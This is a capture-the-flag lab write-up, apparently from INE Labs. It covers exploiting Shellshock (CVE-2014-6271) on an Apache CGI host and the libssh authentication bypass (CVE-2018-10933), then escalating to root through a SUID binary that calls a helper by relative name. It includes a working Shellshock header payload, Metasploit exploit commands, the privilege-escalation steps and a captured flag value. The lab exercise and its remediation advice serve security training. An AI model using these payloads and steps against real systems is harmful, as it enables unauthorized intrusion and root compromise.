---
title: "System/Host-Based Attacks CTF 2"
description: "Two-target Linux CTF: exploiting Shellshock (CVE-2014-6271) on an Apache CGI host, then abusing the libssh auth bypass (CVE-2018-10933) and a SUID binary chain to escalate to root and capture the flags."
date: 2025-11-07
platform: "INE Labs"
difficulty: "Hard"
tags: ["Shellshock", "CVE-2014-6271", "libssh", "CVE-2018-10933", "SUID", "Privilege Escalation", "Metasploit", "CTF"]
cover: "./photo5.png"
---

# CTF Report: System/Host-Based Attacks II

**Classification:** Host & Network Penetration Testing / System & Host-Based Attacks<br>
**Target 1:** target1.ine.local (192.94.52.3) — Linux, Apache httpd 2.4.6, CGI<br>
**Target 2:** target2.ine.local (192.94.52.4) — Linux, libssh 0.8.3<br>
**Objective:** Capture all four flags.

## 1. Executive Summary

Target 1 runs an Apache CGI script vulnerable to **Shellshock (CVE-2014-6271)**, exploited
via a crafted `User-Agent` header to execute commands and read files. Target 2 exposes
**libssh 0.8.3**, vulnerable to the **authentication bypass (CVE-2018-10933)**; after
landing a shell, a misconfigured **SUID** binary (`welcome`, which calls `greetings` by
relative name) is abused to run an arbitrary payload as root. Four flags are recovered.

## 2. Target 1 — Recon

```bash
ping -c 4 target1.ine.local      # 192.94.52.3
nmap -sV -O -p- target1.ine.local
```

![Ping target1](./photo1.png)

![Full scan — Apache httpd 2.4.6, Linux](./photo2.png)

Default scripts: HTTP title "Browser Detector", risky method TRACE.

```bash
nmap -sV -sC -p 80 target1.ine.local
```

![NSE scripts on port 80](./photo3.png)

The site is a "Modern Art Gallery" served by a CGI script (`browser.cgi`).

![browser.cgi web page](./photo4.png)

## 3. Shellshock (CVE-2014-6271)

Confirming the vulnerability with the Nmap NSE script.

```bash
nmap -sV target1.ine.local --script=http-shellshock --script-args "http-shellshock.uri=/browser.cgi"
```

![http-shellshock — VULNERABLE (CVE-2014-6271)](./photo5.png)

Exploiting it manually through Burp — intercepting the `GET /browser.cgi/` request and
injecting a Shellshock payload into the `User-Agent` header.

```http
User-Agent: () { :; }; echo; echo;/bin/bash -c 'cat /etc/passwd'
```

![Burp — Shellshock payload in User-Agent](./photo6.png)

The server returns `/etc/passwd`, confirming command execution.

![/etc/passwd returned](./photo7.png)

## 4. Flags 1 & 2 — Metasploit Shellshock

Using the Metasploit module to get an interactive session.

```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set LHOST 192.94.52.2
set LPORT 1234
set RHOSTS 192.94.52.3
set TARGETURI /browser.cgi
exploit
```

![apache_mod_cgi_bash_env_exec module configured](./photo8.png)

From the session the flags are read from their locations:

- **Flag 1** — `/` (root directory)
- **Flag 2** — `/opt/apache/htdocs/`

## 5. Target 2 — Recon

```bash
ping -c 4 target2.ine.local      # 192.94.52.4
nmap -sV -O -p- 192.94.52.4
```

![Ping target2](./photo9.png)

Only SSH is open — **libssh 0.8.3**.

![Scan — libssh 0.8.3 on port 22](./photo10.png)

![nmap default scripts on target2](./photo11.png)

Fingerprinting the SSH server and confirming the version.

```bash
use auxiliary/scanner/ssh/ssh_version
run
```

![ssh_version — SSH-2.0-libssh_0.8.3](./photo12.png)

A credential brute-force (`ssh_login`) yields nothing.

![ssh_login — no results](./photo13.png)

## 6. libssh Auth Bypass (CVE-2018-10933)

```bash
use auxiliary/scanner/ssh/libssh_auth_bypass
set ACTION Shell
exploit
sessions 5
```

A command-shell session opens without any credentials.

![libssh_auth_bypass — shell session opened](./photo14.png)

## 7. Flag 3 & SUID Enumeration

The user's home holds `flag.txt` and two binaries, `welcome` and `greetings`.

```bash
ls /home/user      # flag.txt  greetings  welcome
```

- **Flag 3** — `/home/user/flag.txt`

![/home/user — flag.txt and binaries](./photo15.png)

`welcome` is **SUID root** (`-rwsr-xr-x`); `greetings` is root-only (`-rwx------`). Running
`welcome` succeeds; `greetings` is denied.

![File permissions — welcome is SUID root](./photo16.png)

`strings welcome` shows it uses `setuid`/`system` and calls `greetings` by relative name.

```bash
strings welcome      # setuid, system, greetings
```

![strings welcome — calls greetings](./photo17.png)

## 8. Flag 4 — SUID Privilege Escalation

Since `welcome` invokes `greetings` as root, we can't overwrite `greetings` directly, but we
can rename it and drop our own payload in its place.

```bash
mv greetings gr
cp /bin/bash greetings
welcome              # runs our bash as root
```

![Swapping greetings for /bin/bash via SUID welcome](./photo18.png)

`welcome` now spawns a **root** shell, and the final flag is in `/root`.

```bash
cd /root
cat flag.txt
# FLAG4_4ff3f8bf42f84cf78fbb1d67f4e70a7b
```

![Root shell — flag4 from /root](./photo19.png)

## 9. Remediation Recommendations

1. **Patch Bash/Shellshock** (CVE-2014-6271) and disable or sandbox legacy CGI scripts.
2. **Upgrade libssh** past 0.8.3 to remediate the authentication bypass (CVE-2018-10933).
3. **Fix the SUID binary:** call helper programs by absolute path, drop privileges before
   `system()`, and audit/remove unnecessary SUID-root binaries.
4. **Apply least privilege** and file integrity monitoring on user-writable directories.
